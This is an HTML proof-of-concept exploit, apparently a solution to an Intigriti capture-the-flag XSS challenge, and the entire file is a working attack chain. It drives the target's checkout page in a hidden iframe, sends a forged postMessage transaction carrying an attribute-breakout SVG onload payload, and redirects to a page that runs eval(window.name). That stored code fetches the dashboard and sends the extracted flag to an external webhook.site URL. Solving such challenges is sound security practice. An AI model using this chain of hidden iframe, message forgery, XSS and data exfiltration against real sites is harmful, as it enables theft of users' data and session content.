<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Exploit</title>
</head>
<body>
    <iframe 
        id="frame" 
        name="fetch('/dashboard.html').then(r=>r.text()).then(d=>{ navigator.sendBeacon('https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?flag='+encodeURIComponent(d.match(/INTIGRITI\{.*?\}/)[0])) })"
        src="https://challenge-0126.intigriti.io/checkout.html" 
        style="opacity:0;width:0;height:0">
    </iframe>

    <script>
        const TARGET = "https://challenge-0126.intigriti.io";
        const frame = document.getElementById('frame');

        // This tiny payload breaks out of the title="" attribute in marketwatch.html
        // and executes the code we stored in the iframe's name attribute above.
        const tiny_xss = `"><svg/onload=eval(name)>`;

        // Wait for the target checkout page to load in the iframe
        frame.onload = () => {
            setTimeout(() => {
                // STEP 1: CSRF via postMessage (Triggering the vulnerability in checkout.html)
                // We assume the admin has funds in 1337COIN or BTC.
                frame.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: tiny_xss, 
                        currency: '1337COIN', // Using BTC is usually safer/more standard
                        amount: 0.00000001
                    }
                }, '*');

                // STEP 2: Trigger the XSS (Targeting marketwatch.html)
                // We redirect the iframe to the page that displays the transactions.
                // Because we redirect the iframe (not the top window), 'window.name' persists!
                setTimeout(() => {
                    frame.contentWindow.location = TARGET + '/marketwatch.html';
                }, 2000); // Give the API time to save the transaction
            }, 1000);
        };
    </script>
</body>
</html>
